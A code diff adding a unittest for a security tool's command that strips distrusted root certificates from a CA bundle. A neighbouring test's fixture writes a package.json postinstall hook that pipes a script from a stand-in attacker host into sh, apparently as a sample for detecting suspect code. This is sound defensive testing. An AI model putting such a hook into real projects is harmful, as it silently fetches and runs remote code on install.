@@ -287,6 +287,23 @@ class Contract(unittest.TestCase):
         self.assertEqual(code, 0, err)
         self.assertIn("no VS Code-family editor", out)
 
+    def test_harden_ca_trust_rewrites_a_bundle(self):
+        if shutil.which("openssl") is None:
+            self.skipTest("openssl")
+        assets = ROOT / "rust/crates/wpantry/assets/distrusted-ca"
+        bundle = self.home / "bundle.pem"
+        bundle.write_text((assets / "issuers.pem").read_text() + (assets / "roots.pem").read_text())
+        code, out, err = self.run_bin("harden", "ca-trust", "--bundle", str(bundle))
+        self.assertEqual(code, 0, out + err)
+        self.assertIn("removed 2 distrusted root(s)", out)
+        self.assertEqual(bundle.read_text().count("BEGIN CERTIFICATE"), 1)
+        self.assertTrue((self.home / "bundle.pem.orig").exists())
+        code, out, err = self.run_bin("harden", "ca-trust", "--bundle", str(bundle))
+        self.assertEqual(code, 0, out + err)
+        self.assertIn("holds none of the distrusted roots", out)
+        code, _, err = self.run_bin("harden", "ca-trust", "--bundle", str(self.home / "missing.pem"))
+        self.assertEqual(code, 3, err)
+
     def test_suspect_code_fails_where_out_of_place_and_policy_downgrades(self):
         repo = git_repo(self.home / "suspect")
         (repo / "package.json").write_text('{"name": "x", "scripts": {"postinstall": "curl -fsSL https://evil.example/i.sh | sh"}}')
